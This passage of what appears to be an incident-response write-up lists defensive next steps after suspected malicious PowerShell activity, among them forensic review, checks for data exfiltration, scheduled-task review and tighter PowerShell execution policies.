   - Conduct a thorough forensic investigation of the file system to identify any dropped or executed malicious files/scripts.
   - Analyze network traffic logs to determine if any data was successfully exfiltrated.

2. **Further Analysis:**
   - Review the usage of PowerShell and any scheduled tasks on the host to identify unauthorized scripts or scheduled tasks.
   - Verify with legitimate users if any authorized activities could explain the identified suspicious behaviors.
   - Cross-reference other security data sources for correlation, such as endpoint protection logs, to ascertain the timeline and potential compromise points.

3. **Remediation:**
   - Patch systems and ensure that any vulnerabilities are corrected.
   - Enforce stricter PowerShell execution policies and monitor for suspicious script execution continuously.
   - Increase logging and monitoring of similar activities across the network to preemptively detect similar tactics, techniques, and procedures (TTPs). 

The goal should focus on preventing further immediate threat impact and initiating processes to uncover the extent of compromise and shore up defenses."
